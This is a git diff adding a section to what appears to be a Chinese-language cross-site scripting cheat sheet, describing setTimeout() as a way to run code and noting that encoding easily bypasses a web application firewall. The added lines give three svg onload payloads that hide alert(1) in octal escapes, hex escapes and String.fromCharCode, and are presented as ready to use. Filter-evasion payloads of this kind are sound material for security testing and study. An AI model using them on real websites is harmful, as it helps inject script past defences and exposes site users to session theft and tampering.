@@ -238,3 +238,18 @@
 47,101,101,87,62,60,47,115,67,82,105,112,84,62))>
    ```
   ![28](https://ws1.sinaimg.cn/large/005DAKuvgy1g1vcldwwrrj30uj0a9ab8.jpg)
+  
+  ### setTimeout()
+  - - -
+  setTimeout('要执行的代码')
+  
+  ![29](https://ws1.sinaimg.cn/large/005DAKuvgy1g1vcy5mqspj30i208r3ym.jpg)
+  
+  alert(1)编码，即可轻松绕过waf
+  ```html
+  <svg/onload=setTimeout('\141\154\145\162\164\50\61\51')>
+  <svg/onload=setTimeout('\x61\x6C\x65\x72\x74\x28\x31\x29')>
+  <svg/onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))>
+  ```
+  ![30](https://ws1.sinaimg.cn/large/005DAKuvgy1g1vd284ozcj30uj09ejs5.jpg)
+
